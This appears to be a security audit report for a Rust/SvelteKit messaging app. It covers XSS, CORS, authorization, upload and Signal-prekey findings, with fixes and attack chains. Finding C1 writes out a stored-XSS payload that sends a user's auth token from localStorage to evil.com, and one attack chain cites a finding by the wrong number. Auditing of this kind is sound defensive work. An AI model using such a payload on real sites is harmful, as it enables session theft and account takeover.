# Oceana Security Audit Report

**Date:** 2026-03-18
**Scope:** Full-stack application (Rust/Axum backend, SvelteKit frontend)
**Method:** Manual code review, red team assessment

---

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 4 |
| HIGH | 7 |
| MEDIUM | 10 |
| LOW | 6 |
| INFO | 5 |
| **Total** | **32** |

---

## CRITICAL

### C1. Stored XSS — SSR renders unsanitized HTML

**File:** `frontend/src/lib/components/Markdown.svelte:88-89`

DOMPurify is skipped entirely on the server-side rendering path. Raw markdown-to-HTML output is rendered via `{@html}` with zero sanitization.

```js
} else {
    sanitized = raw; // SSR: NO SANITIZATION
}
```

**Exploit:** Post `<img src=x onerror="fetch('https://evil.com/?t='+localStorage.getItem('auth'))">`. On SSR-rendered page load, the script executes before client hydration.

**Fix:** Use `isomorphic-dompurify` or a server-compatible sanitizer. Never render raw HTML on any path.

---

### C2. Stored XSS — Post-sanitization embed injection

**File:** `frontend/src/lib/components/Markdown.svelte:84-95`

DOMPurify runs first, then embed `<iframe>` HTML is re-injected via string replacement *after* sanitization, bypassing it entirely.

```js
sanitized = DOMPurify.sanitize(raw, { ADD_TAGS: ['iframe'], ... });
// Then embeds injected AFTER sanitization:
return sanitized.replace(/<div data-embed="(\d+)"><\/div>/g, (_, idx) => {
    return embed ? embed.html : '';
});
```

**Fix:** Run DOMPurify *after* embed replacement, or construct embed elements via DOM API.

---

### C3. Permissive CORS allows cross-origin exploitation

**File:** `backend/src/main.rs:67`

```rust
.layer(CorsLayer::permissive())
```

Sets `Access-Control-Allow-Origin: *` with all methods/headers. Any malicious site can make authenticated API calls on behalf of a logged-in user.

**Fix:** Restrict to actual frontend origin(s):
```rust
CorsLayer::new().allow_origin("https://oceana.io".parse().unwrap())
```

---

### C4. Hardcoded seed user passwords

**File:** `backend/migrations/999_seed.sql`

All seed users share password `password123`. Migration re-runs silently on startup (errors swallowed with `.ok()`).

**Fix:** Gate seed data behind `DEV_SEED=true` env var. Never ship to production.

---

## HIGH

### H1. No membership check on typing events

**File:** `backend/src/routes.rs:662-687`

`handle_typing` does not verify the sender is a conversation member, unlike `handle_send_message`. Any authenticated user can inject typing indicators into any conversation and enumerate membership.

**Fix:** Add the same membership check used in `handle_send_message`.

---

### H2. Arbitrary user injection into conversations

**File:** `backend/src/routes.rs:401-409`

`create_conversation` does not validate that participant UUIDs exist or that consent is given. Any user can force any other user into a conversation.

**Fix:** Validate participant existence; require mutual follow or consent.

---

### H3. JWT token in WebSocket query string

**File:** `backend/src/routes.rs:537`

```rust
Query(query): Query<WsQuery>,  // ?token=eyJ...
```

Tokens in URLs are logged in server access logs, browser history, proxy logs, and Referer headers.

**Fix:** Use a short-lived ticket exchange pattern, or pass the token in the first WebSocket frame.

---

### H4. Email leaked via unauthenticated user endpoint

**File:** `backend/src/routes.rs:109-119`, `backend/src/models.rs:8-18`

`GET /users/:id` requires no authentication and returns the full `User` struct including `email`. Password hash is skipped, but email is not.

**Fix:** Add `#[serde(skip_serializing)]` to email, or create a public profile DTO.

---

### H5. OPK exhaustion DoS on Signal key bundles

**File:** `backend/src/routes.rs:807-813`

`GET /keys/bundle/:user_id` atomically deletes a one-time prekey on every call with no rate limiting. An attacker can exhaust all OPKs, degrading forward secrecy.

**Fix:** Rate-limit per requester; only serve OPKs to users sharing a conversation with the target.

---

### H6. Migration errors silently swallowed

**File:** `backend/src/main.rs:51`

```rust
sqlx::query(stmt).execute(&db).await.ok();
```

Failed schema migrations are silently ignored, potentially leaving the database without security constraints.

**Fix:** Log errors; fail startup on critical migration failures.

---

### H7. Unauthenticated user profile endpoint

**File:** `backend/src/routes.rs:109-119`

`get_user` has no `AuthUser` extractor. Anyone can enumerate all user profiles.

**Fix:** Require authentication or return a limited public profile.

---

## MEDIUM

### M1. No rate limiting on any endpoint

No rate limiting middleware exists. Enables login brute-force, registration spam, post flooding, and OPK exhaustion.

**Fix:** Add `tower::limit::RateLimitLayer` or a custom middleware.

---

### M2. Upload reads full body before size check

**File:** `backend/src/routes.rs:495-498`

The entire file is read into memory, *then* the 10MB limit is checked. Attackers can exhaust server memory.

**Fix:** Use `DefaultBodyLimit` middleware or stream bytes with an early abort.

---

### M3. Unbounded WebSocket connections per user

**File:** `backend/src/chat.rs:23`

No limit on connections per user. An attacker can open thousands to exhaust memory and file descriptors.

**Fix:** Cap at ~5 connections per user; close oldest on overflow.

---

### M4. Plaintext stored alongside ciphertext

**File:** `backend/src/routes.rs:620-631`

The message table accepts both `plaintext` and `ciphertext` simultaneously. For "encrypted" conversations, plaintext may still be stored server-side.

**Fix:** Reject messages containing both; for encrypted conversations, only store ciphertext.

---

### M5. No magic-byte validation on uploads

**File:** `backend/src/routes.rs:491-493`

Only the client-provided `Content-Type` header is checked. An attacker can upload HTML/SVG as `image/jpeg`.

**Fix:** Validate file magic bytes (first few bytes). Add `X-Content-Type-Options: nosniff`.

---

### M6. Missing `X-Content-Type-Options: nosniff` on uploads

**File:** `backend/src/routes.rs:521-525`

Enables content-type sniffing attacks on served uploads.

**Fix:** Add the header to upload responses.

---

### M7. No email format validation

**File:** `backend/src/routes.rs:61-66`

Arbitrary strings accepted as email addresses.

**Fix:** Validate email format server-side.

---

### M8. Unbounded `bio` length

**File:** `backend/src/routes.rs:121-134`

`display_name` has a DB `VARCHAR(64)` but `bio` is `TEXT` with no limit. Enables storage abuse.

**Fix:** Validate input lengths server-side (e.g., bio max 500 chars).

---

### M9. Token in localStorage (XSS-exfiltrable)

**File:** `frontend/src/lib/stores/auth.ts:28`

JWT stored in `localStorage` is accessible to any JS on the page. Combined with XSS findings, tokens are trivially stolen.

**Fix:** Use `httpOnly` cookies for token storage.

---

### M10. Path traversal — backslash not blocked

**File:** `backend/src/routes.rs:717-723`

Only `/` and `..` are blocked in upload filenames. On Windows, `\` is also a path separator.

**Fix:** Whitelist pattern: allow only `[a-f0-9-]+\.(jpg|png|gif|webp)`.

---

## LOW

### L1. JWT uses HS256 (symmetric signing)

**File:** `backend/src/auth.rs:28`

If the secret leaks, anyone can forge tokens. Asymmetric algorithms (ES256) are preferred.

---

### L2. No refresh token mechanism

1-hour expiry with no refresh flow. Users must re-login frequently.

---

### L3. Weak password policy

Only minimum 8 characters enforced. No complexity requirements.

---

### L4. Argon2 default (low) parameters

**File:** `backend/src/auth.rs:79-81`

Intentionally weak for dev speed. Must be tuned for production.

---

### L5. No CSRF protection

Mitigated by Bearer token auth (not cookies), but becomes exploitable if session-based auth is added.

---

### L6. No pagination on conversation listing

`list_conversations` returns all conversations with no limit.

---

## INFO

| # | Finding |
|---|---------|
| I1 | Debug logging enabled by default (`main.rs:23`) |
| I2 | Server binds `0.0.0.0:3000` — all interfaces (`main.rs:71`) |
| I3 | Upload directory at filesystem root `/uploads` (`main.rs:63`) |
| I4 | No HTTPS enforcement — relies on reverse proxy |
| I5 | JWT error details leaked to client (`error.rs:38-40`) |

---

## Attack Chains

### Chain 1: Full account takeover via XSS
`C1 (SSR XSS)` + `M9 (localStorage token)` + `C3 (permissive CORS)` = attacker posts malicious content, steals any viewer's JWT, makes API calls from any origin.

### Chain 2: Signal protocol degradation
`H5 (OPK exhaustion)` + `M1 (no rate limiting)` = attacker exhausts victim's one-time prekeys, downgrading forward secrecy for all future key exchanges.

### Chain 3: Conversation surveillance
`H6 (typing no auth check)` + `H2 (force user into conversation)` = attacker creates conversation with victim and monitors their activity.

---

## Recommended Priority

1. **Immediate:** Fix C1, C2, C3 (XSS + CORS chain enables full account takeover)
2. **This week:** Fix H1-H5 (authorization gaps, information disclosure)
3. **Before production:** Fix all MEDIUM findings (rate limiting, upload hardening)
4. **Ongoing:** Address LOW/INFO as part of hardening
